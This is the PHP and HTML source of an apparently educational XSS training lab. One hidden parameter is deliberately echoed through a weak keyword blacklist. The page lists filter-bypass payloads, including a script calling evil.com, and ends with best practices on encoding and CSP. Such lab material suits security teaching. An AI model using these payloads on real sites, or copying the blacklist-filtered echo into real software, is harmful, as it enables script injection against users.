<?php
if(isset($_GET["fname"]) && isset($_GET["lname"])){
  echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
  echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["q"])){
    echo htmlspecialchars($_GET["q"], ENT_QUOTES);
}
elseif(isset($_GET["s"])){
    echo htmlspecialchars($_GET["s"], ENT_QUOTES);
}
elseif(isset($_GET["search"])){
    echo htmlspecialchars($_GET["search"], ENT_QUOTES);
}
elseif(isset($_GET["lang"])){
    echo htmlspecialchars($_GET["lang"], ENT_QUOTES);
}
elseif(isset($_GET["keyword"])){
    echo htmlspecialchars($_GET["keyword"], ENT_QUOTES);
}
elseif(isset($_GET["query"])){
    echo htmlspecialchars($_GET["query"], ENT_QUOTES);
}
elseif(isset($_GET["page"])){
    echo htmlspecialchars($_GET["page"], ENT_QUOTES);
}
elseif(isset($_GET["keywords"])){
    echo htmlspecialchars($_GET["keywords"], ENT_QUOTES);
}
elseif(isset($_GET["year"])){
    echo htmlspecialchars($_GET["year"], ENT_QUOTES);
}
elseif(isset($_GET["view"])){
    echo htmlspecialchars($_GET["view"], ENT_QUOTES);
}
elseif(isset($_GET["email"])){
    echo htmlspecialchars($_GET["email"], ENT_QUOTES);
}
elseif(isset($_GET["type"])){
    echo htmlspecialchars($_GET["type"], ENT_QUOTES);
}
elseif(isset($_GET["name"])){
    echo htmlspecialchars($_GET["name"], ENT_QUOTES);
}
elseif(isset($_GET["p"])){
    echo htmlspecialchars($_GET["p"], ENT_QUOTES);
}
elseif(isset($_GET["callback"])){
    echo htmlspecialchars($_GET["callback"], ENT_QUOTES);
}
elseif(isset($_GET["jsonp"])){
    echo htmlspecialchars($_GET["jsonp"], ENT_QUOTES);
}
elseif(isset($_GET["api_key"])){
    echo htmlspecialchars($_GET["api_key"], ENT_QUOTES);
}
elseif(isset($_GET["api"])){
    echo htmlspecialchars($_GET["api"], ENT_QUOTES);
}
elseif(isset($_GET["password"])){
    echo htmlspecialchars($_GET["password"], ENT_QUOTES);
}
elseif(isset($_GET["email"])){
    echo htmlspecialchars($_GET["email"], ENT_QUOTES);
}
elseif(isset($_GET["emailto"])){
    echo htmlspecialchars($_GET["emailto"], ENT_QUOTES);
}
elseif(isset($_GET["token"])){
    echo htmlspecialchars($_GET["token"], ENT_QUOTES);
}
elseif(isset($_GET["username"])){
    echo htmlspecialchars($_GET["username"], ENT_QUOTES);
}
elseif(isset($_GET["csrf_token"])){
    echo htmlspecialchars($_GET["csrf_token"], ENT_QUOTES);
}
elseif(isset($_GET["unsubscribe_token"])){
    echo htmlspecialchars($_GET["unsubscribe_token"], ENT_QUOTES);
}
elseif(isset($_GET["id"])){
    echo htmlspecialchars($_GET["id"], ENT_QUOTES);
}
elseif(isset($_GET["item"])){
    echo htmlspecialchars($_GET["item"], ENT_QUOTES);
}
elseif(isset($_GET["page_id"])){
    echo htmlspecialchars($_GET["page_id"], ENT_QUOTES);
}
elseif(isset($_GET["month"])){
    echo htmlspecialchars($_GET["month"], ENT_QUOTES);
}
elseif(isset($_GET["immagine"])){
    echo htmlspecialchars($_GET["immagine"], ENT_QUOTES);
}
elseif(isset($_GET["list_type"])){
    echo htmlspecialchars($_GET["list_type"], ENT_QUOTES);
}
elseif(isset($_GET["url"])){
    echo htmlspecialchars($_GET["url"], ENT_QUOTES);
}
elseif(isset($_GET["terms"])){
    echo htmlspecialchars($_GET["terms"], ENT_QUOTES);
}
elseif(isset($_GET["categoryid"])){
    echo htmlspecialchars($_GET["categoryid"], ENT_QUOTES);
}
elseif(isset($_GET["key"])){
    echo htmlspecialchars($_GET["key"], ENT_QUOTES);
}
elseif(isset($_GET["l"])){
    echo htmlspecialchars($_GET["l"], ENT_QUOTES);
}
elseif(isset($_GET["begindate"])){
    echo htmlspecialchars($_GET["begindate"], ENT_QUOTES);
}
elseif(isset($_GET["enddate"])){
    echo htmlspecialchars($_GET["enddate"], ENT_QUOTES);
}
elseif(isset($_GET["ll"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus');
    $re = str_replace($arr, '', $_GET['ll']);
    echo $re;
}
?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>KrazePlanetLabs - Needle in a Haystack XSS Lab</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">

  <style>
    :root {
      --primary-dark: #1a1f36;
      --primary-light: #2d3748;
      --accent-green: #48bb78;
      --accent-blue: #4299e1;
      --accent-orange: #ed8936;
      --accent-red: #f56565;
      --accent-purple: #9f7aea;
      --accent-pink: #ed64a6;
    }
    
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #e2e8f0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .navbar-brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--accent-green) !important;
    }

    .nav-link {
      font-weight: 500;
      transition: color 0.3s;
    }

    .nav-link:hover {
      color: var(--accent-green) !important;
    }

    .hero-section {
      background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                  url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
      padding: 2rem 0;
      border-bottom: 1px solid #2d3748;
      margin-bottom: 2rem;
    }

    .hero-title {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(90deg, #48bb78, #4299e1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.5rem;
    }

    .hero-subtitle {
      font-size: 1rem;
      color: #cbd5e0;
    }

    .section-title {
      margin-top: 30px;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.5rem;
      position: relative;
      padding-bottom: 10px;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 60px;
      height: 4px;
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border-radius: 2px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .card-header {
      background: rgba(15, 23, 42, 0.5);
      border-bottom: 1px solid #334155;
      font-weight: 600;
      padding: 1rem 1.5rem;
    }

    .form-control {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
      padding: 0.75rem 1rem;
    }

    .form-control:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .form-label {
      font-weight: 500;
      color: #cbd5e0;
    }

    .btn-primary {
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border: none;
      padding: 0.75rem 1.5rem;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
    }

    .search-box {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .btn-outline-success {
      border-color: var(--accent-green);
      color: var(--accent-green);
    }

    .btn-outline-success:hover {
      background-color: var(--accent-green);
      border-color: var(--accent-green);
      color: #1a202c;
    }

    pre {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1.5rem;
      color: #e2e8f0;
      border: 1px solid #334155;
      overflow-x: auto;
      max-height: 300px;
      overflow-y: auto;
    }

    .output-section {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-top: 2rem;
    }

    .output-title {
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--accent-green);
    }

    .output-content {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      min-height: 60px;
      border: 1px solid #334155;
    }

    .lab-info {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }

    .needle-haystack-badge {
      background: linear-gradient(45deg, var(--accent-purple), var(--accent-pink));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-needle 2s infinite alternate;
      text-shadow: 0 0 10px rgba(159, 122, 234, 0.5);
    }

    @keyframes pulse-needle {
      0% { 
        box-shadow: 0 0 10px var(--accent-purple); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-purple), 0 0 30px var(--accent-pink); 
        transform: scale(1.02);
      }
    }

    .filter-info {
      background: rgba(30, 41, 59, 0.7);
      border-left: 4px solid var(--accent-pink);
      padding: 1rem 1.5rem;
      margin: 1.5rem 0;
      border-radius: 0 8px 8px 0;
    }

    .progress {
      height: 8px;
      background-color: #2d3748;
      margin: 1rem 0;
    }

    .progress-bar {
      background: linear-gradient(90deg, var(--accent-pink), var(--accent-purple));
    }

    .case-variations {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      border: 1px solid #334155;
    }

    .function-filter-notice {
      background: rgba(237, 100, 166, 0.1);
      border: 1px solid var(--accent-pink);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .param-security-level {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 600;
      margin-left: 0.5rem;
    }

    .security-high {
      background-color: var(--accent-green);
      color: #1a202c;
    }

    .security-medium {
      background-color: var(--accent-orange);
      color: #1a202c;
    }

    .security-low {
      background-color: var(--accent-red);
      color: white;
    }

    .tab-content {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-top: none;
      border-radius: 0 0 12px 12px;
      padding: 1.5rem;
    }

    .nav-tabs {
      border-bottom: 1px solid #334155;
    }

    .nav-tabs .nav-link {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-bottom: none;
      color: #cbd5e0;
      border-radius: 8px 8px 0 0;
      margin-right: 0.25rem;
    }

    .nav-tabs .nav-link.active {
      background: rgba(15, 23, 42, 0.9);
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
      font-weight: 600;
    }

    .nav-tabs .nav-link:hover {
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
    }

    .filter-demo {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
      border: 1px solid #334155;
    }

    .blacklist-item {
      background: var(--accent-red);
      color: white;
      padding: 0.25rem 0.5rem;
      border-radius: 4px;
      font-size: 0.75rem;
      font-weight: 600;
      margin: 0.1rem;
      display: inline-block;
    }

    .param-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 1rem;
      margin-top: 1rem;
    }

    .param-card {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      border: 1px solid #334155;
    }

    .param-card.vulnerable {
      border: 2px solid var(--accent-red);
      box-shadow: 0 0 10px rgba(245, 101, 101, 0.3);
    }

    .arjun-tool-info {
      background: rgba(66, 153, 225, 0.1);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .blacklist-category {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
      border: 1px solid #334155;
    }

    .category-title {
      font-weight: 600;
      margin-bottom: 0.5rem;
      color: var(--accent-green);
    }

    .needle-hint {
      background: rgba(237, 137, 54, 0.1);
      border: 1px solid var(--accent-orange);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">
        <i class="bi bi-shield-shaded me-2"></i>KrazePlanetLabs
      </a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
        data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
        aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" href="../../about">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="../../contact">Contact Us</a>
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle active" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
              Categories
            </a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Reflected XSS</a></li>
              <li><a class="dropdown-item" href="#">Stored XSS</a></li>
              <li><a class="dropdown-item" href="#">DOM XSS</a></li>
              <li><a class="dropdown-item" href="#">Blind XSS</a></li>
            </ul>
          </li>
        </ul>
        <form class="d-flex" role="search">
          <input class="form-control search-box me-2" type="search" placeholder="Search labs..." aria-label="Search">
          <button class="btn btn-outline-success" type="submit">Search</button>
        </form>
      </div>
    </div>
  </nav>

  <div class="hero-section">
    <div class="container">
      <h1 class="hero-title">Needle in a Haystack XSS Lab</h1>
      <p class="hero-subtitle">Find the one vulnerable parameter hidden among 30+ secure parameters</p>
    </div>
  </div>

  <div class="container mb-5">
    <div class="lab-info">
      <div class="needle-haystack-badge">Needle in a Haystack Challenge</div>
      <h3 class="section-title">Lab Overview</h3>
      <p>This lab demonstrates a real-world scenario where most parameters are properly secured, but one parameter uses blacklist filtering instead of proper encoding. With over 30 parameters using htmlspecialchars(), you need to find the single vulnerable parameter.</p>
      
      <div class="function-filter-notice">
        <i class="bi bi-exclamation-triangle me-2"></i><strong>Mixed Security Implementation:</strong> 30+ parameters use htmlspecialchars() encoding (secure), but one parameter uses blacklist filtering (vulnerable).
      </div>
      
      <div class="arjun-tool-info">
        <i class="bi bi-tools me-2"></i><strong>Parameter Discovery Challenge:</strong> There are over 30 parameters to test. Use tools like Arjun to discover them all and find the vulnerable one!
        <div class="mt-2">
          <code># use arjun tool to find all parameters</code>
        </div>
      </div>

      <div class="needle-hint">
        <i class="bi bi-lightbulb me-2"></i><strong>Hint:</strong> You already found this vulnerable parameter in Lab No. 2. Look for patterns from previous challenges!
      </div>
      
      <div class="filter-info">
        <i class="bi bi-funnel me-2"></i><strong>Parameter Security Levels:</strong>
        <div class="case-variations">
          <div class="row mt-2">
            <div class="col-md-6">
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-high">Secure</span>
                <span class="ms-2">30+ parameters - Use htmlspecialchars()</span>
              </div>
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-low">Vulnerable</span>
                <span class="ms-2">1 parameter - Uses blacklist filtering</span>
              </div>
            </div>
            <div class="col-md-6">
              <div class="d-flex align-items-center">
                <span class="badge bg-warning me-2">Realistic Scenario</span>
                <span>Mixed security implementations are common</span>
              </div>
              <div class="d-flex align-items-center mt-2">
                <span class="badge bg-info me-2">Discovery Challenge</span>
                <span>Find the needle in the haystack</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div class="filter-demo">
        <h6>Sample Parameters (Partial List):</h6>
        
        <div class="param-grid">
          <div class="param-card">
            <h6>Parameter: fname</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: lname</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: q</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: search</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: keyword</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: query</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: page</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: email</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: username</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card">
            <h6>Parameter: password</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
          <div class="param-card vulnerable">
            <h6>Parameter: ???</h6>
            <small class="text-danger">Vulnerable - Blacklist filtering</small>
          </div>
          <div class="param-card">
            <h6>Parameter: ...</h6>
            <small>Secure - htmlspecialchars()</small>
          </div>
        </div>
        
        <div class="row mt-3">
          <div class="col-md-6">
            <strong>Secure Parameters (30+):</strong>
            <div class="mt-1">
              <code>Input: &lt;script&gt;alert(1)&lt;/script&gt;</code>
            </div>
            <div class="mt-1">
              <code>Output: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>
            </div>
          </div>
          <div class="col-md-6">
            <strong>Vulnerable Parameter (1):</strong>
            <div class="mt-1">
              <code>Input: &lt;script&gt;alert(1)&lt;/script&gt;</code>
            </div>
            <div class="mt-1">
              <code>Output: &lt;&gt;alert(1)&lt;/&gt;</code>
            </div>
          </div>
        </div>
        <div class="mt-2">
          <small>One parameter among many uses blacklist filtering instead of proper encoding, creating a hidden vulnerability.</small>
        </div>
      </div>
      
      <div class="mt-3">
        <div class="d-flex justify-content-between align-items-center">
          <span>Overall Security Level:</span>
          <span class="text-warning">Mixed Security</span>
        </div>
        <div class="progress">
          <div class="progress-bar" style="width: 70%"></div>
        </div>
      </div>
      
      <p><strong>Objective:</strong> Discover all parameters and find the single vulnerable one that uses blacklist filtering instead of proper encoding.</p>
    </div>

    <div class="row">
      <div class="col-lg-6">
        <div class="card mb-4">
          <div class="card-header text-center">
            <i class="bi bi-code-slash me-2"></i>Backend Source Code
          </div>
          <div class="card-body">
            <pre>
// 30+ parameters use secure encoding
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["q"])){
    echo htmlspecialchars($_GET["q"], ENT_QUOTES);
}
// ... 30+ more parameters with htmlspecialchars()

// One parameter uses vulnerable blacklist filtering
elseif(isset($_GET["???"])){
    $arr = array('details','alert','confirm','prompt','eval',
                'ontoggle','onmousemove','onmouseover',
                'script','Script','sCript','scRipt','scrIpt',
                'scriPt','scripT','SCript','SCRipt','SCRIpt',
                'SCRIPt','SCRIPT','img','image','svg','onfocus');
    $re = str_replace($arr, '', $_GET['???']);
    echo $re;
}</pre>
          </div>
        </div>
      </div>
      
      <div class="col-lg-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-input-cursor-text me-2"></i>Test Input Forms
          </div>
          <div class="card-body">
            <ul class="nav nav-tabs" id="paramTabs" role="tablist">
              <li class="nav-item" role="presentation">
                <button class="nav-link active" id="visible-tab" data-bs-toggle="tab" data-bs-target="#visible" type="button" role="tab">Visible Parameters</button>
              </li>
              <li class="nav-item" role="presentation">
                <button class="nav-link" id="hidden-tab" data-bs-toggle="tab" data-bs-target="#hidden" type="button" role="tab">Hidden Parameters</button>
              </li>
            </ul>
            <div class="tab-content" id="paramTabsContent">
              <div class="tab-pane fade show active" id="visible" role="tabpanel">
                <h5 class="mb-3">Visible Parameters (HTML Encoded)</h5>
                <form action="" method="get" class="mb-4">
                  <div class="mb-3">
                    <label for="fname" class="form-label">First Name <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter first name" aria-label="First name" name="fname" value="<?php echo isset($_GET['fname']) ? htmlspecialchars($_GET['fname']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="lname" class="form-label">Last Name <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter last name" aria-label="Last name" name="lname" value="<?php echo isset($_GET['lname']) ? htmlspecialchars($_GET['lname']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test HTML Encoding</button>
                </form>
              </div>
              <div class="tab-pane fade" id="hidden" role="tabpanel">
                <h5 class="mb-3">Hidden Parameters (Mixed Security)</h5>
                <div class="arjun-tool-info">
                  <i class="bi bi-info-circle me-2"></i><strong>Challenge:</strong> There are 30+ hidden parameters. Most are secure, but one uses blacklist filtering. Use parameter discovery tools!
                </div>
                <form action="" method="get">
                  <div class="mb-3">
                    <label for="q" class="form-label">Parameter 'q' <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter q value" aria-label="q" name="q" value="<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q']) : ''; ?>">
                    <div class="form-text">Uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="search" class="form-label">Parameter 'search' <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter search value" aria-label="search" name="search" value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
                    <div class="form-text">Uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="page" class="form-label">Parameter 'page' <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter page value" aria-label="page" name="page" value="<?php echo isset($_GET['page']) ? htmlspecialchars($_GET['page']) : ''; ?>">
                    <div class="form-text">Uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="id" class="form-label">Parameter 'id' <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter id value" aria-label="id" name="id" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
                    <div class="form-text">Uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="ll" class="form-label">Parameter 'll' <span class="param-security-level security-low">Vulnerable</span></label>
                    <input class="form-control" type="text" placeholder="Enter ll value" aria-label="ll" name="ll" value="<?php echo isset($_GET['ll']) ? htmlspecialchars($_GET['ll']) : ''; ?>">
                    <div class="form-text">Uses blacklist filtering - XSS possible!</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test Parameters</button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <?php if(isset($_GET["fname"]) && isset($_GET["lname"])): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Visible Parameters Output (HTML Encoded)
      </div>
      <div class="output-content">
        <?php 
          echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
          echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
        ?>
      </div>
      <div class="mt-3">
        <small class="text-success"><i class="bi bi-check-circle me-1"></i>Output is safely encoded with htmlspecialchars()</small>
      </div>
    </div>
    <?php endif; ?>

    <?php 
    $secure_params = ['q', 's', 'search', 'lang', 'keyword', 'query', 'page', 'keywords', 'year', 'view', 'email', 'type', 'name', 'p', 'callback', 'jsonp', 'api_key', 'api', 'password', 'emailto', 'token', 'username', 'csrf_token', 'unsubscribe_token', 'id', 'item', 'page_id', 'month', 'immagine', 'list_type', 'url', 'terms', 'categoryid', 'key', 'l', 'begindate', 'enddate'];
    $vulnerable_param = 'll';
    
    $has_secure_output = false;
    $has_vulnerable_output = false;
    
    foreach($secure_params as $param) {
        if(isset($_GET[$param])) {
            $has_secure_output = true;
            break;
        }
    }
    
    if(isset($_GET[$vulnerable_param])) {
        $has_vulnerable_output = true;
    }
    ?>

    <?php if($has_secure_output): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Secure Parameters Output (HTML Encoded)
      </div>
      <div class="output-content">
        <?php 
        foreach($secure_params as $param) {
            if(isset($_GET[$param])) {
                echo "<div class='mb-3'><strong>Parameter '$param':</strong><br>";
                echo htmlspecialchars($_GET[$param], ENT_QUOTES);
                echo "</div>";
            }
        }
        ?>
      </div>
      <div class="mt-3">
        <small class="text-success"><i class="bi bi-check-circle me-1"></i>These parameters are safely encoded with htmlspecialchars()</small>
      </div>
    </div>
    <?php endif; ?>

    <?php if($has_vulnerable_output): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Vulnerable Parameter Output (Blacklist Filtered)
      </div>
      <div class="output-content">
        <div class='mb-3'><strong>Parameter 'll':</strong><br>
        <?php 
          $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus');
          $re = str_replace($arr, '', $_GET['ll']);
          echo $re;
        ?>
        </div>
      </div>
      <div class="mt-3">
        <small class="text-danger"><i class="bi bi-exclamation-triangle me-1"></i>WARNING: This parameter uses blacklist filtering - XSS is possible!</small>
      </div>
    </div>
    <?php endif; ?>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-lightbulb me-2"></i>XSS Bypass Techniques for the Vulnerable Parameter
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>String Concatenation Bypass:</h6>
                <ul>
                  <li><code>&lt;script&gt;window['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;this['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;self['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;top['al'+'ert'](1)&lt;/script&gt;</code></li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Alternative Tags/Events:</h6>
                <ul>
                  <li><code>&lt;iframe src=javascript:al&#x65;rt(1)&gt;</code></li>
                  <li><code>&lt;body onload=window['al'+'ert'](1)&gt;</code></li>
                  <li><code>&lt;marquee onstart=al&#x65;rt(1)&gt;&lt;/marquee&gt;</code></li>
                  <li><code>&lt;object data=javascript:al&#x65;rt(1)&gt;</code></li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-md-6">
                <h6>Character Encoding Bypass:</h6>
                <ul>
                  <li><code>&lt;script&gt;window['&#x61;lert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;window['\x61lert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;window['\141lert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;window[`al${''}ert`](1)&lt;/script&gt;</code></li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Alternative Functions:</h6>
                <ul>
                  <li><code>&lt;script&gt;print()&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;open()&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;console.log(1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;fetch('http://evil.com')&lt;/script&gt;</code></li>
                </ul>
              </div>
            </div>
            
            <div class="filter-demo mt-3">
              <h6>Blacklist Filter Analysis:</h6>
              <p>The vulnerable parameter filters these keywords:</p>
              <div class="mb-2">
                <span class="blacklist-item">script</span>
                <span class="blacklist-item">alert</span>
                <span class="blacklist-item">confirm</span>
                <span class="blacklist-item">prompt</span>
                <span class="blacklist-item">eval</span>
                <span class="blacklist-item">ontoggle</span>
                <span class="blacklist-item">onmousemove</span>
                <span class="blacklist-item">onmouseover</span>
                <span class="blacklist-item">onfocus</span>
                <span class="blacklist-item">img</span>
                <span class="blacklist-item">image</span>
                <span class="blacklist-item">svg</span>
                <span class="blacklist-item">details</span>
              </div>
              <p>Plus multiple case variations of 'script'</p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-shield-exclamation me-2"></i>Security Implications
          </div>
          <div class="card-body">
            <p>Mixed security implementations demonstrate:</p>
            <ul>
              <li>One vulnerable parameter can compromise an entire application</li>
              <li>Security consistency is critical across all parameters</li>
              <li>Parameter discovery is essential for comprehensive testing</li>
              <li>Blacklist filtering provides false sense of security</li>
              <li>Legacy code or new features may introduce vulnerabilities</li>
              <li>Automated tools may miss single vulnerable parameters</li>
            </ul>
          </div>
        </div>
      </div>
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-check-circle me-2"></i>Best Practices
          </div>
          <div class="card-body">
            <p>For secure web applications:</p>
            <ul>
              <li>Apply consistent security controls to ALL parameters</li>
              <li>Use context-aware output encoding instead of blacklists</li>
              <li>Implement strict Content Security Policy (CSP) headers</li>
              <li>Test all parameters with comprehensive security testing</li>
              <li>Use parameter discovery tools during security assessments</li>
              <li>Implement security code reviews for all changes</li>
              <li>Assume attackers will find and exploit any inconsistency</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-code-square me-2"></i>Real-World Security Implications
          </div>
          <div class="card-body">
            <div class="row">
